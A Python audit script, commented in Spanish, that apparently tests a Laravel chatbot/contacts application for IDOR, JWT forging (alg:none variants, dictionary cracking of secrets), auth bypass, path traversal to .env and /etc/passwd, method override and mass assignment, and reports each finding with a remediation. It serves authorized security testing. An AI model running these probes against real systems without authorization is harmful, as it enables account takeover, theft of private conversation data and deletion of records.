#!/usr/bin/env python3
"""
=============================================================================
SUPER SCRIPT v3 — AUTORIZACIÓN, IDOR Y LÓGICA DE NEGOCIO (Tests 26-40)
=============================================================================
Objetivo: Auditar los vectores que el pentest v2 NO cubre:
    [26] IDOR en /chatbot/node/{id}
    [27] IDOR en /instancias/{id}
    [28] IDOR en historial de contactos (fuga de PII)
    [29] IDOR en envío directo de mensajes
    [30] JWT expirado aceptado
    [31] JWT con role=admin forjado
    [32] JWT alg:none / algorithm confusion
    [33] JWT logout blacklist (token sigue válido tras logout)
    [34] Role escalation real (user no-admin → ruta admin)
    [35] Web auth bypass (ruta admin sin sesión)
    [36] Meta onboarding token predictability
    [37] Path traversal en /storage/{path}
    [38] Fuga de datos sensibles en respuestas JSON
    [39] HTTP method override (_method=DELETE)
    [40] Mass assignment en rutas admin

Uso:
    python audit_auth.py --url http://127.0.0.1:8000 \
        --jwt "eyJ..." \
        --user-jwt "eyJ..." \
        --admin-jwt "eyJ..."

O con login por sesión (web routes):
    python audit_auth.py --url http://127.0.0.1:8000 \
        --admin-email admin@test.com --admin-password secreto \
        --user-email user@test.com  --user-password secreto123

Requisitos:
    - Al menos --jwt (para tests API) o credenciales (para web)
    - Idealmente: admin + user para probar escalada real

Códigos de salida:
    0=OK  1=LOW  2=HIGH  3=CRITICAL  4=error conexión
=============================================================================
"""

import sys, os, json, time, base64, hmac, hashlib, argparse, re
import http.cookiejar
import urllib.request, urllib.error, urllib.parse
from datetime import datetime, timezone
from typing import Optional, Dict, List, Tuple, Any

if sys.platform == "win32":
    try: sys.stdout.reconfigure(encoding="utf-8")
    except Exception: pass

RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; GRAY = "\033[90m"
BOLD = "\033[1m"; RESET = "\033[0m"

SEVERITY_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0, "OK": -1}
FINDINGS: List[Dict[str, Any]] = []
VERBOSE = False
BASE_URL = ""

# Configuración inyectada desde CLI
CFG = {
    "jwt": None, "user_jwt": None, "admin_jwt": None,
    "admin_session": None, "user_session": None,
    "known_instancia": 1, "known_contacto": 1,
    "known_node": 1, "known_option": 1,
}

# Secretos JWT comunes (ataque por diccionario)
COMMON_JWT_SECRETS = [
    "secret", "jwt", "jwtsecret", "jwt-secret", "jwt_secret",
    "password", "admin", "changeme", "laravel", "laravel_jwt",
    "your-256-bit-secret", "test", "key", "app", "application",
    "mysecret", "my-secret", "s3cr3t", "supersecret", "1234567890",
    "JWT_SECRET", "hs256", "hs256secret",
]

# ============================================================================
# HELPERS
# ============================================================================

def vprint(*args, **kwargs):
    if VERBOSE: print(*args, **kwargs)


def severity_color(sev: str) -> str:
    return {"CRITICAL": RED, "HIGH": YELLOW, "MEDIUM": MAGENTA,
            "LOW": BLUE, "INFO": CYAN, "OK": GREEN}.get(sev, RESET)


def record_finding(test_id: int, name: str, severity: str, evidence: str, remediation: str = ""):
    FINDINGS.append({
        "test_id": test_id, "name": name, "severity": severity,
        "evidence": evidence[:500], "remediation": remediation,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    })
    color = severity_color(severity)
    icon = {"CRITICAL": "🚨", "HIGH": "⚠️", "MEDIUM": "🔶",
            "LOW": "🔷", "INFO": "ℹ️", "OK": "✅"}.get(severity, "•")
    print(f"  {color}{BOLD}{icon} [{severity}]{RESET} {evidence[:200]}")


def safe_json(body: str) -> Optional[dict]:
    try: return json.loads(body)
    except Exception: return None


def is_real_api_response(status: int, headers: dict, body: str) -> bool:
    if status == 0: return False
    if "text/html" in headers.get("content-type", "").lower(): return False
    s = body.strip()
    return not (s.startswith("<!DOCTYPE") or s.startswith("<html"))


# ---------- JWT UTILS ----------

def b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4: s += "=" * pad
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> Tuple[Optional[dict], Optional[dict], Optional[str]]:
    try:
        parts = token.split(".")
        if len(parts) != 3: return None, None, None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None, None, None


def forge_jwt(payload: dict, header: Optional[dict] = None, secret: Optional[str] = None) -> str:
    if header is None:
        header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if secret:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        s = b64url_encode(sig)
    else:
        s = ""
    return f"{h}.{p}.{s}"


def crack_jwt_secret(token: str) -> Optional[str]:
    """Intenta crackear el secret HMAC del JWT con un diccionario."""
    parts = token.split(".")
    if len(parts) != 3: return None
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        return None
    if header.get("alg") != "HS256": return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    real_sig = parts[2]
    for secret in COMMON_JWT_SECRETS:
        expected = b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
        if hmac.compare_digest(expected, real_sig):
            return secret
    return None


# ============================================================================
# HTTP CLIENT (cookie-aware + JWT)
# ============================================================================

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class HTTPClient:
    def __init__(self, base_url: str, jwt: Optional[str] = None, timeout: int = 12):
        self.base_url = base_url.rstrip("/")
        self.jwt = jwt
        self.timeout = timeout
        self.cookiejar = http.cookiejar.CookieJar()

    def request(self, method: str, endpoint: str,
                payload=None, headers: Optional[dict] = None,
                follow_redirects: bool = False,
                use_jwt: bool = True,
                override_jwt: Optional[str] = None) -> Tuple[int, Dict[str, str], str]:
        url = f"{self.base_url}{endpoint}"
        hdrs = dict(headers or {})

        token = override_jwt if override_jwt is not None else (self.jwt if use_jwt else None)
        if token:
            hdrs.setdefault("Authorization", f"Bearer {token}")

        data = None
        if payload is not None:
            if isinstance(payload, dict):
                data = json.dumps(payload).encode()
                hdrs.setdefault("Content-Type", "application/json")
            elif isinstance(payload, bytes):
                data = payload
            elif isinstance(payload, str):
                data = payload.encode()
                hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")

        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)

        handlers = [urllib.request.HTTPCookieProcessor(self.cookiejar)]
        if not follow_redirects: handlers.append(NoRedirect)
        opener = urllib.request.build_opener(*handlers)

        try:
            with opener.open(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                return resp.getcode(), {k.lower(): v for k, v in resp.headers.items()}, body
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore")
            return e.code, {k.lower(): v for k, v in e.headers.items()}, body
        except urllib.error.URLError as e:
            return 0, {}, f"URLError: {e.reason}"
        except Exception as e:
            return 0, {}, f"{type(e).__name__}: {e}"

    def login_session(self, email: str, password: str) -> bool:
        """Hace login web con cookies (soporta CSRF de Laravel)."""
        # 1) GET /login para CSRF
        status, _, body = self.request("GET", "/login", use_jwt=False, follow_redirects=True)
        if status == 0: return False

        csrf = None
        m = re.search(r'name="_token"\s+value="([^"]+)"', body)
        if not m:
            m = re.search(r'name="csrf-token"\s+content="([^"]+)"', body)
        if m: csrf = m.group(1)

        form = {"email": email, "password": password}
        if csrf: form["_token"] = csrf

        # 2) POST /login
        status, headers, body = self.request(
            "POST", "/login", payload=urllib.parse.urlencode(form),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            use_jwt=False, follow_redirects=False,
        )
        # Laravel redirige 302 a /home al éxito
        success = status in (301, 302) and "login" not in headers.get("location", "").lower()
        vprint(f"    login_session({email}): HTTP {status}, loc={headers.get('location', '')} → {'OK' if success else 'FAIL'}")
        return success


# ============================================================================
# REGISTRO DE TESTS
# ============================================================================

TEST_REGISTRY: Dict[int, callable] = {}
def test(test_id):
    def wrap(fn):
        TEST_REGISTRY[test_id] = fn
        return fn
    return wrap


# ============================================================================
# TESTS 26-29: IDOR
# ============================================================================

def _idor_probe(client: HTTPClient, method: str, endpoint: str,
                payload=None, token_override=None, use_jwt=True) -> Tuple[int, int, str]:
    """Retorna (status_sin_auth, status_con_token, body_snippet)."""
    # Sin auth
    st_noauth, _, _ = client.request(method, endpoint, payload, use_jwt=False)
    # Con token (usuario normal)
    st_auth, _, body = client.request(method, endpoint, payload,
                                     use_jwt=use_jwt, override_jwt=token_override)
    return st_noauth, st_auth, body[:200]


@test(26)
def test_idor_chatbot_nodes(client: HTTPClient):
    print(f"\n{BOLD}[TEST 26] IDOR — /chatbot/node/{{id}}{RESET}")
    print(f"  {GRAY}Ruta admin. Probar con user JWT (no-admin){RESET}")

    token = CFG.get("user_jwt") or CFG.get("jwt")
    if not token:
        record_finding(26, "IDOR ChatbotNode", "INFO", "SKIP: sin --user-jwt/--jwt")
        return

    endpoints = [
        ("GET", f"/chatbot/node/{CFG['known_node']}", None),
        ("PUT", f"/chatbot/node/{CFG['known_node']}", {"mensaje": "idor-test"}),
        ("DELETE", f"/chatbot/node/{CFG['known_node']}", None),
    ]
    hits = []
    for method, ep, payload in endpoints:
        st_noauth, st_auth, body = _idor_probe(client, method, ep, payload, token_override=token)
        # IDOR si: autenticado devuelve 200/204 (contenido) sin importar ser admin
        if st_auth in (200, 201, 204):
            hits.append(f"{method} {ep} → HTTP {st_auth}")
            vprint(f"    🚨 {method} {ep}: noauth={st_noauth}, auth={st_auth}")
        else:
            vprint(f"    ✓ {method} {ep}: noauth={st_noauth}, auth={st_auth}")

    if hits:
        record_finding(26, "IDOR ChatbotNode", "CRITICAL",
                       f"User no-admin puede operar chatbot nodes: {hits}",
                       "Policy/Gate: $this->authorize('update', $node); RoleMiddleware solo verifica rol")
    else:
        record_finding(26, "IDOR ChatbotNode", "OK", "Ruta admin bloquea user no-admin")


@test(27)
def test_idor_instancias(client: HTTPClient):
    print(f"\n{BOLD}[TEST 27] IDOR — /instancias/{{id}}{RESET}")

    token = CFG.get("user_jwt") or CFG.get("jwt")
    if not token:
        record_finding(27, "IDOR Instancias", "INFO", "SKIP")
        return

    eps = [
        ("GET", f"/instancias/{CFG['known_instancia']}", None),
        ("PUT", f"/instancias/{CFG['known_instancia']}", {"nombre_empresa": "idor"}),
    ]
    hits = []
    for method, ep, payload in eps:
        st_noauth, st_auth, body = _idor_probe(client, method, ep, payload, token_override=token)
        if st_auth in (200, 201, 204):
            hits.append(f"{method} {ep} → {st_auth}")
            vprint(f"    🚨 {method} {ep}: {st_auth}")

    if hits:
        record_finding(27, "IDOR Instancias", "CRITICAL",
                       f"User no-admin accede a instancias: {hits}",
                       "authorize('view/update', $instancia) + ownership check")
    else:
        record_finding(27, "IDOR Instancias", "OK", "Protegido")


@test(28)
def test_idor_historial(client: HTTPClient):
    print(f"\n{BOLD}[TEST 28] IDOR — /instancias/{{id}}/contactos/{{cid}}/historial{RESET}")
    print(f"  {GRAY}Alto valor: devuelve historial de conversaciones (PII){RESET}")

    token = CFG.get("user_jwt") or CFG.get("jwt")
    if not token:
        record_finding(28, "IDOR Historial", "INFO", "SKIP")
        return

    ep = f"/instancias/{CFG['known_instancia']}/contactos/{CFG['known_contacto']}/historial"
    st_noauth, st_auth, body = _idor_probe(client, "GET", ep, token_override=token)

    if st_auth == 200 and len(body) > 50:
        record_finding(28, "IDOR Historial", "CRITICAL",
                       f"Acceso a historial ajeno: HTTP 200 ({len(body)} bytes)",
                       "authorize + ownership por instancia y por contactoId")
    elif st_auth in (401, 403, 404):
        record_finding(28, "IDOR Historial", "OK", f"Bloqueado ({st_auth})")
    else:
        record_finding(28, "IDOR Historial", "INFO", f"HTTP {st_auth}")


@test(29)
def test_idor_enviar(client: HTTPClient):
    print(f"\n{BOLD}[TEST 29] IDOR — /instancias/{{id}}/contactos/{{cid}}/enviar{RESET}")

    token = CFG.get("user_jwt") or CFG.get("jwt")
    if not token:
        record_finding(29, "IDOR Enviar", "INFO", "SKIP")
        return

    ep = f"/instancias/{CFG['known_instancia']}/contactos/{CFG['known_contacto']}/enviar"
    payload = {"mensaje": "idor-pentest-do-not-process"}
    st_noauth, st_auth, body = _idor_probe(client, "POST", ep, payload, token_override=token)

    if st_auth in (200, 201, 204):
        record_finding(29, "IDOR Enviar", "CRITICAL",
                       f"Envío no autorizado a contacto ajeno: HTTP {st_auth}",
                       "authorize + throttle por usuario + ownership")
    else:
        record_finding(29, "IDOR Enviar", "OK", f"Protegido ({st_auth})")


# ============================================================================
# TESTS 30-33: JWT MANIPULATION
# ============================================================================

@test(30)
def test_jwt_expired(client: HTTPClient):
    print(f"\n{BOLD}[TEST 30] JWT — Token expirado aceptado{RESET}")

    if not CFG.get("jwt"):
        record_finding(30, "JWT Expired", "INFO", "SKIP: sin --jwt")
        return

    header, payload, _ = decode_jwt(CFG["jwt"])
    if not payload:
        record_finding(30, "JWT Expired", "INFO", "No se pudo decodificar JWT")
        return

    forged = dict(payload)
    forged["exp"] = int(time.time()) - 3600  # expiró hace 1h
    forged["iat"] = int(time.time()) - 7200
    forged_token = forge_jwt(forged, header={"alg": "none", "typ": "JWT"})

    status, _, _ = client.request("GET", "/api/user", override_jwt=forged_token)
    if status == 200:
        record_finding(30, "JWT Expired", "CRITICAL",
                       "Token expirado (alg:none) fue aceptado",
                       "Validar exp en el guard; algorithm whitelist")
    elif status in (401, 403):
        record_finding(30, "JWT Expired", "OK", f"Rechazado ({status})")
    else:
        record_finding(30, "JWT Expired", "INFO", f"HTTP {status}")


@test(31)
def test_jwt_role_escalation(client: HTTPClient):
    print(f"\n{BOLD}[TEST 31] JWT — Escalada vía payload forjado (role=admin){RESET}")

    if not CFG.get("jwt"):
        record_finding(31, "JWT Role Escalation", "INFO", "SKIP")
        return

    _, payload, _ = decode_jwt(CFG["jwt"])
    if not payload:
        record_finding(31, "JWT Role Escalation", "INFO", "JWT inválido")
        return

    # 1) Probar alg:none
    forged = dict(payload); forged["role"] = "admin"; forged["is_admin"] = True
    forged_token = forge_jwt(forged, header={"alg": "none", "typ": "JWT"})
    status, _, _ = client.request("GET", "/api/user", override_jwt=forged_token)

    if status == 200:
        record_finding(31, "JWT Role Escalation", "CRITICAL",
                       "JWT con role=admin forjado (alg:none) aceptado",
                       "Rechazar alg:none; validar role contra DB, no contra claim")
        return

    # 2) Probar si el secret es crackeable
    secret = crack_jwt_secret(CFG["jwt"])
    if secret:
        record_finding(31, "JWT Role Escalation", "CRITICAL",
                       f"Secret JWT crackeado: '{secret}'. Cualquiera puede forjar tokens",
                       "Rotar JWT_SECRET a 64+ chars aleatorios: php artisan jwt:secret")
    else:
        record_finding(31, "JWT Role Escalation", "OK",
                       f"alg:none rechazado; secret no crackeable en diccionario ({len(COMMON_JWT_SECRETS)} intentos)")


@test(32)
def test_jwt_alg_confusion(client: HTTPClient):
    print(f"\n{BOLD}[TEST 32] JWT — Algorithm Confusion{RESET}")

    if not CFG.get("jwt"):
        record_finding(32, "JWT Alg Confusion", "INFO", "SKIP")
        return

    _, payload, _ = decode_jwt(CFG["jwt"])
    if not payload:
        record_finding(32, "JWT Alg Confusion", "INFO", "JWT inválido")
        return

    variants = [
        ("none lowercase", forge_jwt(payload, {"alg": "none"})),
        ("NONE mayúsculas", forge_jwt(payload, {"alg": "NONE"})),
        ("None mixto",      forge_jwt(payload, {"alg": "None"})),
        ("sin alg",         forge_jwt(payload, {"typ": "JWT"})),
    ]
    accepted = []
    for name, tok in variants:
        st, _, _ = client.request("GET", "/api/user", override_jwt=tok)
        if st == 200:
            accepted.append(name)

    if accepted:
        record_finding(32, "JWT Alg Confusion", "CRITICAL",
                       f"Variantes de alg:none aceptadas: {accepted}",
                       "Whitelist ['HS256','RS256'] en el guard")
    else:
        record_finding(32, "JWT Alg Confusion", "OK", "Todas las variantes alg:none rechazadas")


@test(33)
def test_jwt_logout_blacklist(client: HTTPClient):
    print(f"\n{BOLD}[TEST 33] JWT — Logout blacklist{RESET}")

    if not CFG.get("jwt"):
        record_finding(33, "JWT Blacklist", "INFO", "SKIP")
        return

    # Verificar token válido antes
    st1, _, _ = client.request("GET", "/api/user")
    if st1 != 200:
        record_finding(33, "JWT Blacklist", "INFO", f"Token no válido inicial (HTTP {st1})")
        return

    # Logout
    st_l, _, _ = client.request("POST", "/api/auth/logout")
    vprint(f"    logout: HTTP {st_l}")

    # Reintentar uso
    st2, _, _ = client.request("GET", "/api/user")
    if st2 == 200:
        record_finding(33, "JWT Blacklist", "CRITICAL",
                       "Token sigue válido después de logout → sin blacklist",
                       "jwt.blacklist middleware; TTL corto + refresh rotation")
    elif st2 in (401, 403):
        record_finding(33, "JWT Blacklist", "OK", f"Token invalidado tras logout ({st2})")
    else:
        record_finding(33, "JWT Blacklist", "INFO", f"HTTP {st2} (¿ruta logout existe?)")


# ============================================================================
# TESTS 34-35: ROLE / AUTH BYPASS
# ============================================================================

@test(34)
def test_role_escalation_web(client: HTTPClient):
    print(f"\n{BOLD}[TEST 34] Role escalation — user normal → ruta admin{RESET}")

    if not CFG.get("user_session") and not CFG.get("user_jwt"):
        record_finding(34, "Role Escalation", "INFO", "SKIP: sin user session/jwt")
        return

    client_user = CFG.get("user_session") or client
    admin_routes = ["/chatbot", "/instancias", "/panel-contactos", "/meta/onboarding-token"]

    hits = []
    for ep in admin_routes:
        st, hdrs, body = client_user.request("GET", ep)
        # Si devuelve 200 con contenido → no bloqueó
        if st == 200 and len(body) > 500 and "<title>" in body.lower():
            hits.append(f"{ep} → 200")
        elif st in (302, 403):
            vprint(f"    ✓ {ep}: bloqueado ({st})")
        else:
            vprint(f"    ? {ep}: {st}")

    if hits:
        record_finding(34, "Role Escalation", "CRITICAL",
                       f"User normal accede a rutas admin: {hits}",
                       "Verificar que RoleMiddleware:admin realmente se ejecuta")
    else:
        record_finding(34, "Role Escalation", "OK", "Rutas admin bloquean user no-admin")


@test(35)
def test_web_auth_bypass(client: HTTPClient):
    print(f"\n{BOLD}[TEST 35] Web auth bypass (sin sesión){RESET}")

    admin_routes = ["/chatbot", "/instancias", "/home", "/panel-contactos"]
    hits = []
    for ep in admin_routes:
        st, hdrs, body = client.request("GET", ep, use_jwt=False)
        if st == 200 and len(body) > 500:
            hits.append(f"{ep} → 200 ({len(body)}b)")
            vprint(f"    🚨 {ep}: 200 sin auth")
        elif st in (302, 401, 403):
            vprint(f"    ✓ {ep}: {st} (protegido)")

    if hits:
        record_finding(35, "Web Auth Bypass", "CRITICAL",
                       f"Rutas sin auth devuelven 200: {hits}",
                       "Verificar middleware auth en RouteServiceProvider")
    else:
        record_finding(35, "Web Auth Bypass", "OK", "Todas las rutas admin redirigen/deniegan sin sesión")


# ============================================================================
# TEST 36: META ONBOARDING TOKEN
# ============================================================================

@test(36)
def test_meta_onboarding_token(client: HTTPClient):
    print(f"\n{BOLD}[TEST 36] Meta onboarding — Token predictability{RESET}")

    # 1) Verificar que tokens inválidos son rechazados
    invalid_tokens = ["abc", "123", "a" * 64, "0" * 32, "../../etc/passwd"]
    all_rejected = True
    for tok in invalid_tokens:
        st, _, body = client.request("GET", f"/conectar-meta/{tok}", use_jwt=False)
        if st == 200 and len(body) > 500 and "invalid" not in body.lower() and "expir" not in body.lower():
            all_rejected = False
            vprint(f"    🚨 token '{tok}': 200 con contenido")
            break

    if not all_rejected:
        record_finding(36, "Meta Onboarding Token", "HIGH",
                       "Tokens inválidos no rechazados (posible enumeración)",
                       "Validar existencia + expiración + single-use")
        return

    # 2) Verificar entropía si tenemos acceso admin a /meta/onboarding-token
    if CFG.get("admin_session"):
        st, _, body = CFG["admin_session"].request("POST", "/meta/onboarding-token")
        parsed = safe_json(body) or {}
        token = parsed.get("token") or parsed.get("data", {}).get("token")
        if token:
            vprint(f"    token generado: {token[:20]}... (len={len(token)})")
            if len(token) < 32:
                record_finding(36, "Meta Onboarding Token", "HIGH",
                               f"Token demasiado corto ({len(token)} chars) → fuerza bruta viable",
                               "Str::random(64) o bin2hex(random_bytes(32))")
                return
            # Buscar patrones predecibles
            if re.match(r"^\d+$", token) or re.match(r"^[0-9a-f]{8,16}$", token):
                record_finding(36, "Meta Onboarding Token", "MEDIUM",
                               f"Token con patrón predecible: {token[:30]}",
                               "Usar random_bytes + Str::random")
                return
            record_finding(36, "Meta Onboarding Token", "OK",
                           f"Token generado con entropía OK (len={len(token)})")
            return

    record_finding(36, "Meta Onboarding Token", "OK", "Tokens inválidos rechazados (test parcial)")


# ============================================================================
# TEST 37: STORAGE TRAVERSAL
# ============================================================================

@test(37)
def test_storage_traversal(client: HTTPClient):
    print(f"\n{BOLD}[TEST 37] Path traversal — /storage/{{path}}{RESET}")

    payloads = [
        "/storage/../.env",
        "/storage/..%2F.env",
        "/storage/..%252F.env",
        "/storage/%2e%2e/.env",
        "/storage/app/../.env",
        "/storage/../config/database.php",
        "/storage/../../etc/passwd",
        "/storage/.env",
        "/storage/logs/laravel.log",
        "/storage/../storage/logs/laravel.log",
    ]

    hits = []
    for ep in payloads:
        st, hdrs, body = client.request("GET", ep, use_jwt=False)
        if st == 200 and len(body) > 50:
            # Verificar firma de contenido sensible
            indicators = ["DB_PASSWORD", "APP_KEY", "root:x:", "mysql", "password"]
            if any(ind in body for ind in indicators):
                hits.append(ep)
                vprint(f"    🚨 {ep}: {len(body)}b, contenido sensible")
            else:
                vprint(f"    ? {ep}: 200 pero sin contenido sensible ({len(body)}b)")

    if hits:
        record_finding(37, "Storage Traversal", "CRITICAL",
                       f"Path traversal expone archivos: {hits}",
                       "Validar path con realpath() + whitelist de directorios")
    else:
        record_finding(37, "Storage Traversal", "OK", f"{len(payloads)} payloads, sin exposición")


# ============================================================================
# TEST 38: SENSITIVE DATA IN RESPONSES
# ============================================================================

@test(38)
def test_sensitive_data_leak(client: HTTPClient):
    print(f"\n{BOLD}[TEST 38] Fuga de datos sensibles en JSON{RESET}")

    if not CFG.get("jwt"):
        record_finding(38, "Sensitive Data Leak", "INFO", "SKIP")
        return

    endpoints = ["/api/user", "/api/auth/me", "/api/enviar-mensaje"]
    forbidden_keys = ["password", "password_hash", "api_key", "api_secret",
                     "access_token", "remember_token", "secret", "app_key",
                     "jwt_secret", "whatsapp_access_token"]
    hits = []

    for ep in endpoints:
        st, hdrs, body = client.request("GET" if "user" in ep or "me" in ep else "POST", ep,
                                       payload={} if "enviar" in ep else None)
        if st != 200: continue
        try:
            data = json.loads(body)
            flat = json.dumps(data).lower()
            found = [k for k in forbidden_keys if f'"{k}"' in flat]
            # Excluir access_token del propio JWT (legítimo)
            found = [k for k in found if not (k == "access_token" and "bearer" not in flat)]
            if found:
                hits.append(f"{ep}: {found}")
        except Exception:
            pass

    if hits:
        record_finding(38, "Sensitive Data Leak", "HIGH",
                       f"Respuestas filtran campos: {hits}",
                       "$hidden en modelos; API Resources con ->only([...])")
    else:
        record_finding(38, "Sensitive Data Leak", "OK", "Sin campos sensibles en respuestas")


# ============================================================================
# TEST 39: HTTP METHOD OVERRIDE
# ============================================================================

@test(39)
def test_method_override(client: HTTPClient):
    print(f"\n{BOLD}[TEST 39] HTTP Method Override ({BOLD}_method=DELETE{RESET}{BOLD}){RESET}")

    if not CFG.get("admin_session") and not CFG.get("jwt"):
        record_finding(39, "Method Override", "INFO", "SKIP")
        return

    c = CFG.get("admin_session") or client
    payload = {"_method": "DELETE"}
    ep = f"/instancias/{CFG['known_instancia']}"

    st, _, body = c.request("POST", ep, payload=urllib.parse.urlencode(payload),
                            headers={"Content-Type": "application/x-www-form-urlencoded"})

    if st in (200, 204, 302):
        record_finding(39, "Method Override", "HIGH",
                       f"POST con _method=DELETE aceptado (HTTP {st}) → CSRF potencial",
                       "Verificar CSRF token incluso en POST con _method")
    else:
        record_finding(39, "Method Override", "OK", f"Bloqueado ({st})")


# ============================================================================
# TEST 40: MASS ASSIGNMENT EN ADMIN ROUTES
# ============================================================================

@test(40)
def test_mass_assignment_admin(client: HTTPClient):
    print(f"\n{BOLD}[TEST 40] Mass assignment en rutas admin{RESET}")

    if not CFG.get("admin_session"):
        record_finding(40, "Mass Assignment Admin", "INFO", "SKIP: sin admin session")
        return

    payload = {
        "nombre_empresa": "mass-assign-test",
        "is_active": True,
        "user_id": 1,
        "id": 999999,
        "created_at": "2000-01-01 00:00:00",
    }
    st, _, body = CFG["admin_session"].request(
        "POST", "/instancias",
        payload=urllib.parse.urlencode(payload),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    if st in (200, 201, 302):
        parsed = safe_json(body) or {}
        if parsed.get("id") == 999999 or parsed.get("created_at", "").startswith("2000"):
            record_finding(40, "Mass Assignment Admin", "HIGH",
                           "Campos protegidos (id, created_at) asignables vía input",
                           "$fillable explícito en Instancia; nunca aceptar id ni created_at")
            return
    record_finding(40, "Mass Assignment Admin", "OK", "Mass assignment mitigado")


# ============================================================================
# ORQUESTADOR
# ============================================================================

def print_banner():
    print(f"{CYAN}{BOLD}")
    print("=" * 78)
    print("   🔐  AUDIT v3 — Autorización, IDOR y Lógica de Negocio  🔐")
    print(f"   Target: {BASE_URL}")
    print(f"   Fecha:  {datetime.now(timezone.utc).isoformat()}")
    print("=" * 78)
    print(f"{RESET}")


def print_summary() -> int:
    print(f"\n{CYAN}{BOLD}" + "=" * 78)
    print("   📊 RESUMEN")
    print("=" * 78 + f"{RESET}")

    if not FINDINGS:
        print(f"  {GREEN}Sin hallazgos.{RESET}")
        return 0

    sorted_f = sorted(FINDINGS, key=lambda f: -SEVERITY_ORDER.get(f["severity"], 0))
    counts = {}
    for f in sorted_f:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO", "OK"]:
        if sev in counts:
            color = severity_color(sev)
            print(f"  {color}{BOLD}{sev:<10}{RESET} {counts[sev]:>3}")

    print(f"\n{BOLD}Detalle:{RESET}")
    for f in sorted_f:
        color = severity_color(f["severity"])
        print(f"  {color}[{f['severity']:<8}]{RESET} #{f['test_id']:>2} {f['name']}: {f['evidence'][:110]}")

    if "CRITICAL" in counts: return 3
    if "HIGH" in counts:     return 2
    if counts.get("MEDIUM") or counts.get("LOW"): return 1
    return 0


def generate_report(path: str):
    report = {
        "target": BASE_URL,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "type": "authorization_audit_v3",
        "findings": FINDINGS,
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, ensure_ascii=False)
    print(f"\n{GREEN}📄 Reporte JSON: {path}{RESET}")


def main():
    global BASE_URL, VERBOSE

    p = argparse.ArgumentParser(description="Auth/IDOR Audit v3")
    p.add_argument("--url", required=True)
    p.add_argument("--jwt", default=None, help="JWT principal (API)")
    p.add_argument("--user-jwt", default=None, help="JWT de usuario NO admin")
    p.add_argument("--admin-jwt", default=None, help="JWT de usuario admin")
    p.add_argument("--user-email", default=None)
    p.add_argument("--user-password", default=None)
    p.add_argument("--admin-email", default=None)
    p.add_argument("--admin-password", default=None)
    p.add_argument("--instancia-id", type=int, default=1)
    p.add_argument("--contacto-id", type=int, default=1)
    p.add_argument("--node-id", type=int, default=1)
    p.add_argument("--json-report", default=None)
    p.add_argument("--only", default=None)
    p.add_argument("--skip", default=None)
    p.add_argument("--verbose", action="store_true")

    args = p.parse_args()
    BASE_URL = args.url
    VERBOSE = args.verbose
    CFG["jwt"] = args.jwt
    CFG["user_jwt"] = args.user_jwt
    CFG["admin_jwt"] = args.admin_jwt
    CFG["known_instancia"] = args.instancia_id
    CFG["known_contacto"] = args.contacto_id
    CFG["known_node"] = args.node_id

    print_banner()

    # Cliente base (con JWT principal)
    client = HTTPClient(BASE_URL, jwt=args.jwt)
    st, _, body = client.request("GET", "/")
    if st == 0:
        print(f"{RED}❌ No conecta a {BASE_URL}: {body}{RESET}")
        sys.exit(4)

    # Sesiones web si hay credenciales
    if args.admin_email and args.admin_password:
        c = HTTPClient(BASE_URL)
        if c.login_session(args.admin_email, args.admin_password):
            CFG["admin_session"] = c
            print(f"  {GREEN}✅ admin session OK{RESET}")
        else:
            print(f"  {YELLOW}⚠️  admin login falló{RESET}")

    if args.user_email and args.user_password:
        c = HTTPClient(BASE_URL)
        if c.login_session(args.user_email, args.user_password):
            CFG["user_session"] = c
            print(f"  {GREEN}✅ user session OK{RESET}")
        else:
            print(f"  {YELLOW}⚠️  user login falló{RESET}")

    only = set(int(x) for x in args.only.split(",")) if args.only else None
    skip = set(int(x) for x in args.skip.split(",")) if args.skip else set()

    for tid in sorted(TEST_REGISTRY.keys()):
        if only and tid not in only: continue
        if tid in skip:
            print(f"\n{GRAY}[TEST {tid}] SKIP (--skip){RESET}")
            continue
        try:
            TEST_REGISTRY[tid](client)
        except Exception as e:
            record_finding(tid, "ERROR", "INFO", f"{type(e).__name__}: {e}")

    code = print_summary()
    if args.json_report: generate_report(args.json_report)
    sys.exit(code)


if __name__ == "__main__":
    main()